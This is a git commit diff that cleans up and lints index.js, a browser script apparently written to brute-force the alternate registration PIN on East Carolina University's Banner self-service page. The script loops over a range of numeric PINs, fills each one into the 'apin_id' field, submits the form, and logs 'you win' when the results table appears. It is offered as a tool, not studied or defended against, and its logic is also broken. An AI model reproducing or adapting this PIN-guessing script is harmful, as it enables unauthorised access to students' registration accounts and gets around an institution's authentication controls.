712473006fef456b827dfb39e950ad7103639162
Nathan Hernandez <email@nathanph.com>
2017-11-12 15:15:06 -0500

    Remove unnecessary code and begin linting
    This code is messy, we're going to remove the code we're not using and
    start linting with [Feross's Standard](https://github.com/standard/standard).

--- index.js
+++ index.js
@@ -1,85 +1,25 @@
-https://ssbprd-banner.ecu.edu/DAD_PROD/bwskfreg.P_AltPin
-
-urls for pin
-https://ssbprd-banner.ecu.edu/DAD_PROD/bwskfreg.P_AltPin
-https://ssbprd-banner.ecu.edu/DAD_PROD/bwskfreg.P_CheckAltPin
-
-
-396260
-
-for(var i=0; i<10; i++)
-{
-	if( i % 2 == 0)
-	this.document.location = "http://stackoverflow.com/"
-	else
-	this.document.location = "http://github.com/"
-	
-	document.getElementByClassName()
-	
+function stuff (password) {
+  if (document.getElementsByClassName('datadisplaytable').length > 0) {
+    console.log('you win')
+    console.log(i)
+    // window.open('https://ssbprd-banner.ecu.edu/DAD_PROD/bwskfreg.P_AltPin')
+  } else {
+    document.getElementById('apin_id').value = password
+    document.getElementsByTagName('form')[1].submit()
+  }
 }
 
-stuff = function(){
-		document.getElementByClassName("datadisplaytable")
-		console.log("1")
-	}
-	
-for(var i = 396250; i<396270; i++)
-{
-	this.document.location = "https://ssbprd-banner.ecu.edu/DAD_PROD/bwskfreg.P_AltPin"
-    document.onload = stuff()
-}
-stuff function(){
-		document.getElementByClassName("datadisplaytable")
-		console.log("1")
-	}
-**************************************************************************	
-	
-
-stuff = function( password ){
-	if(document.getElementsByClassName("datadisplaytable").length > 0)
-	{
-		console.log("you win")
-		console.log(i)
-		//window.open("https://ssbprd-banner.ecu.edu/DAD_PROD/bwskfreg.P_AltPin")
-	} else {
-		document.getElementById("apin_id").value = password
-		document.getElementsByTagName('form')[1].submit()
-	}
-}
-	
-for(var i = 396250; i<396261; i++)
-{
-	document.location.href = "https://ssbprd-banner.ecu.edu/DAD_PROD/bwskfreg.P_AltPin"
-	console.log(i)
-    document.onload = stuff(i)
+function wait (ms) {
+  var start = new Date().getTime()
+  var end = start
+  while (end < start + ms) {
+    end = new Date().getTime()
+  }
 }
 
-****************************************************************************
-
-function stuff( password ){
-	if(document.getElementsByClassName("datadisplaytable").length > 0)
-	{
-		console.log("you win")
-		console.log(i)
-		//window.open("https://ssbprd-banner.ecu.edu/DAD_PROD/bwskfreg.P_AltPin")
-	} else {
-		document.getElementById("apin_id").value = password
-		document.getElementsByTagName('form')[1].submit()
-	}
-}
-
-function wait(ms) {
-	var start = new Date().getTime();
-	var end = start;
-	while(end<start+ms) {
-		end = new Date().getTime();
-	}
-}
-	
-for(var i = 396250; i<396265; i++)
-{
-	this.document.location = "https://ssbprd-banner.ecu.edu/DAD_PROD/bwskfreg.P_AltPin"
-	console.log(i)
-	wait(1000)
-    stop = window.onload = stuff(i)
+for (var i = 396250; i < 396265; i++) {
+  this.document.location = 'https://ssbprd-banner.ecu.edu/DAD_PROD/bwskfreg.P_AltPin'
+  console.log(i)
+  wait(1000)
+  stop = window.onload = stuff(i)
 }
